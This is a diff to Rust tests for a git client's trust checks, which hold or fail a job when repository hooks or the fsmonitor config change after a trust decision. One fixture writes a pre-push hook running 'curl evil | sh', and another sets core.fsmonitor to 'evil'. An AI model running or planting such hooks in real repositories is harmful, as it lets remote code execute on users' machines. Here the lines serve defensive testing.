@@ -3,7 +3,7 @@
 
 use super::*;
 use crate::effect::{Sealed, TrustCheck};
-use crate::msg::JobMsg;
+use crate::msg::{JobMsg, TrustMsg};
 use glowfly_core::settings::SavedTrust;
 use std::path::{Path, PathBuf};
 
@@ -17,7 +17,7 @@ fn repo(name: &str) -> PathBuf {
 
 fn check(dir: &Path, saved: Option<SavedTrust>) -> TrustCheck {
     let sealed = Sealed::Job { label: "Fetch".into() };
-    TrustCheck { workdir: dir.to_path_buf(), real: dir.to_path_buf(), saved, incoming: Vec::new(), prompts: false, sealed }
+    TrustCheck { workdir: dir.to_path_buf(), real: dir.to_path_buf(), saved, sealed, accept_unchecked: false }
 }
 
 fn hook(dir: &Path, text: &str) {
@@ -50,9 +50,9 @@ fn a_hook_edited_after_the_decision_holds_the_job() {
     let dir = repo("edited");
     hook(&dir, "#!/bin/sh\nexit 0\n");
     let saved = SavedTrust::trusted(Some(glowfly_core::trust::scan_at(&dir).unwrap().print()));
-    assert!(matches!(verify(&check(&dir, Some(saved.clone()))), Verdict::Pass));
+    assert!(matches!(verify(&check(&dir, Some(saved.clone())), &job(&dir)), Verdict::Pass(_)));
     hook(&dir, "#!/bin/sh\ncurl evil | sh\n");
-    let Verdict::Stale(found) = verify(&check(&dir, Some(saved.clone()))) else { panic!("held") };
+    let Verdict::Stale(found) = verify(&check(&dir, Some(saved.clone())), &job(&dir)) else { panic!("held") };
     assert_eq!((found.0.hooks.as_slice(), found.1.is_none()), (&["pre-push".to_owned()][..], true));
     // Executing it sends the effect back instead of running it.
     match execute_checked(check(&dir, Some(saved)), job(&dir)) {
@@ -65,9 +65,9 @@ fn a_hook_edited_after_the_decision_holds_the_job() {
 #[test]
 fn a_hook_that_appears_in_a_clean_repository_holds_the_job() {
     let dir = repo("clean");
-    assert!(matches!(verify(&check(&dir, None)), Verdict::Pass), "nothing runs");
+    assert!(matches!(verify(&check(&dir, None), &job(&dir)), Verdict::Pass(_)), "nothing runs");
     hook(&dir, "#!/bin/sh\nexit 0\n");
-    assert!(matches!(verify(&check(&dir, None)), Verdict::Stale(_)));
+    assert!(matches!(verify(&check(&dir, None), &job(&dir)), Verdict::Stale(_)));
     let _ = std::fs::remove_dir_all(&dir);
 }
 
@@ -79,4 +79,19 @@ fn a_repository_that_cant_be_read_fails_the_job_rather_than_run_it() {
         Some(Msg::Job(JobMsg::JobDone { ok: false, output, .. })) => assert!(output.contains("couldn't check"), "{output}"),
         _ => panic!("the job fails"),
     }
+}
+
+#[test]
+fn a_status_read_that_fails_its_check_reads_without_git() {
+    let dir = repo("read");
+    let read =
+        |git_status| Effect::LoadStatus { workdir: dir.clone(), generation: 1, submodules: false, open: None, git_status, paths: None };
+    let sealed = TrustCheck { sealed: Sealed::Read, ..check(&dir, None) };
+    assert!(matches!(verify(&sealed, &read(true)), Verdict::Pass(_)), "nothing runs yet");
+    // An fsmonitor set since: the read goes on, without git.
+    glowfly_core::testkit::git(&dir, &["config", "core.fsmonitor", "evil"]);
+    assert!(matches!(verify(&sealed, &read(true)), Verdict::Stale(_)), "the cached scan isn't reused once the config changed");
+    let Effect::LoadStatus { git_status, .. } = without_git(read(true)).unwrap() else { panic!("a status read") };
+    assert!(!git_status);
+    let _ = std::fs::remove_dir_all(&dir);
 }
